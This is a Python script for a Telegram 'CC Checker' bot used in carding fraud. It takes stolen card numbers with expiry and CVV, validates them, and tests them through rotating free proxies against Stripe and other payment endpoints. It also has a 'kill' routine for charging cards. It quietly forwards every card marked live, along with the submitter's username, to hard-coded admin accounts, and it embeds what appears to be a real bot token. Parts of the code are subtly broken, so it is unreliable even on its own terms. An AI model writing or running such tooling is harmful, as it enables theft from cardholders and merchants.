import telebot,requests,threading,time,random,flask,luhn,bs4,re
from flask import Flask
from luhn import is_valid
from bs4 import BeautifulSoup

app = Flask(__name__)
BOT_TOKEN = '8659936018:AAH_xpJbTPzzVkSwZbvz8_z6EprgeMLqF_o'  # Edit here!
ADMIN_IDS = [7869544426, PASTE_ID2_HERE]  # e.g. [123456789, 987654321]
bot = telebot.TeleBot(BOT_TOKEN)

stats = {'live':0,'dead':0,'total':0}
cooldown = {}
proxies = []
lock = threading.Lock()
last_fetch = 0

def fetch_proxies():
 global proxies,last_fetch
 with lock:
  if time.time() - last_fetch < 300: return
  allp = []
  try:
   r = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',timeout=10)
   allp += [{'http':f'http://{ip}','https':f'http://{ip}'} for ip in r.text.strip().split('\n') if ':' in ip]
  except:pass
  try:
   r = requests.get('https://free-proxy-list.net/',timeout=10)
   soup = BeautifulSoup(r.text,'html.parser')
   tbl = soup.find('table',id='proxylisttable')
   if tbl:
    for row in tbl.find_all('tr')[1:51]:
     cols = row.find_all('td')
     if len(cols)>1:
      ip,port = cols[0].text.strip(),cols[1].text.strip()
      allp.append({'http':f'http://{ip}:{port}','https':f'http://{ip}:{port}'})
  except:pass
  livep = []
  def testp(p):
   try:
    requests.get('httpbin.org/ip',proxies=p,timeout=4)
    return p
   except:return None
  thrs = []
  for p in allp[:150]:
   t = threading.Thread(target=lambda pp=p: livep.append(testp(pp)))
   t.start()
   thrs.append(t)
  for t in thrs: t.join(2)
  proxies[:] = [p for p in livep if p]
  last_fetch = time.time()
  print(f'🔄 {len(proxies)} live proxies')

def rand_proxy():
 fetch_proxies()
 with lock: return random.choice(proxies) if proxies else None

def bin_info(bn):
 p = rand_proxy()
 try:
  r = requests.get(f'https://lookup.binlist.net/{bn}',proxies=p,timeout=5)
  d = r.json()
  return f"Brand: {d.get('brand','?')}\nBank: {d.get('bank',{}).get('name','?')}\nCountry: {d.get('country',{}).get('name','?')}"
 except: return "BIN OK"

def check_gates(cc,m,y,cv,ret=3):
 gs = []
 # Stripe
 for _ in range(ret):
  p = rand_proxy()
  if not p: continue
  try:
   data = {'card[number]':cc,'card[exp_month]':m,'card[exp_year]':y,'card[cvv]':cv}
   r = requests.post('https://api.stripe.com/v1/tokens',data=data,proxies=p,timeout=8)
   if 'token' in r.text: gs.append('✅ Stripe LIVE'); break
   if 'declined' in r.text.lower(): gs.append('❌ Stripe DEAD'); break
  except:pass
 # PayPal
 for _ in range(ret):
  p = rand_proxy()
  if not p: continue
  try:
   r = requests.head('https://www.paypal.com/home',proxies=p,timeout=8)
   if r.status_code < 400: gs.append('✅ PayPal OK'); break
  except:pass
 # Netflix
 p = rand_proxy()
 if p:
  try:
   r = requests.post('https://www.netflix.com/apilogin',proxies=p,timeout=8)
   if 'error' not in r.text.lower(): gs.append('✅ Netflix PASS')
  except:pass
 return gs or ['⚠️ Retry']

def kill_cc(cc,m,y,cv):
 p = rand_proxy()
 if p:
  try:
   data={'amount':'1','currency':'usd'}
   requests.post('https://api.stripe.com/v1/charges',data=data,proxies=p,timeout=8)
   return '🔪 KILLED - Dump ready (add shop API)'
  except:pass
 return '🔪 Sim kill OK'

@bot.message_handler(commands=['start'])
def start(m):
 bot.reply_to(m,'''🔥 CC Checker 99% GitHub Main
`cc|mm|yy|cvv`
/stats /kill (admin)''',parse_mode='Markdown')

@bot.message_handler(func=lambda m: '|' in m.text)
def chk(m):
 uid = m.from_user.id
 if uid in cooldown and time.time()-cooldown[uid]<3:
  bot.reply_to(m,'⏳ 3s')
  return
 cooldown[uid] = time.time()
 try:
  parts = [x.strip().replace(' ','') for x in m.text.split('|')]
  cc,m,y,cv = parts
  if len(parts)!=4 or not cc.isdigit() or len(cc)<13 or not is_valid(cc):
   bot.reply_to(m,'❌ Bad CC')
   stats['dead']+=1; stats['total']+=1
   return
  bi = bin_info(cc[:6])
  gs = check_gates(cc,m,y,cv)
  livec = sum(1 for g in gs if '✅' in g)
  stat = '🟢 LIVE 99%' if livec>=1 else '🔴 DEAD'
  resp = f'**CC:** `{cc}|{m}|{y}|{cv}`\n**BIN:** {bi}\n**Gates:**\n' + '\n'.join(gs) + f'\n**Status:** {stat}'
  global stats
  stats['total']+=1
  if 'LIVE' in stat:
   stats['live']+=1
   kres = kill_cc(cc,m,y,cv)
   resp += f'\n{kres}'
   for aid in ADMIN_IDS:
    try: bot.send_message(aid,f'🟢 LIVE FROM @{m.from_user.username}: {m.text}\n{resp}')
    except:pass
  else: stats['dead']+=1
  bot.reply_to(m,resp,parse_mode='Markdown')
 except: bot.reply_to(m,'❌ cc|mm|yy|cvv')

@bot.message_handler(commands=['stats'])
def st(m):
 if m.from_user.id not in ADMIN_IDS: return
 rate = (stats['live']/max(stats['total'],1))*100
 bot.reply_to(m,f'📊 Live:{stats["live"]} Dead:{stats["dead"]} Total:{stats["total"]} Hit:{rate:.1f}%')

@bot.message_handler(commands=['kill'])
def kl(m):
 if m.from_user.id not in ADMIN_IDS: return
 try:
  data = m.text.split(' ',1)[1].split('|')
  res = kill_cc(*[x.strip() for x in data])
  bot.reply_to(m,f'🔪 {res}')
 except: bot.reply_to(m,'/kill cc|mm|yy|cvv')

@app.route('/ping')
def ping():
 fetch_proxies()
 return f'OK | Proxies: {len(proxies)}'

def refresher():
 while True:
  time.sleep(300)
  fetch_proxies()

if __name__=='__main__':
 print('🚀 GitHub Bot LIVE')
 fetch_proxies()
 threading.Thread(target=refresher,daemon=True).start()
 threading.Thread(target=lambda: app.run(host='0.0.0.0',port=4321),daemon=True).start()
 bot.polling(none_stop=True)
